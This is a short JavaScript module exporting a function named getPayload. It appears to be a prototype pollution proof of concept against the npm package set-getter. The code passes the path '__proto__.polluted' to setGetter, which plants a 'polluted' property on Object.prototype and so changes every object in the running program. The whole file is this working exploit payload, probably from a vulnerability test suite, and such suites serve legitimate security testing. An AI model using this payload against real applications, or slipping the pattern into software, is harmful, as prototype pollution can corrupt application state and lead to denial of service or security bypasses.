function getPayload() {
    var setGetter = require("set-getter");
    var obj = {};

    setGetter(obj, "__proto__.polluted", function (polluted) {
        return "yes";
    });

    return { obj };
}

module.exports = { getPayload };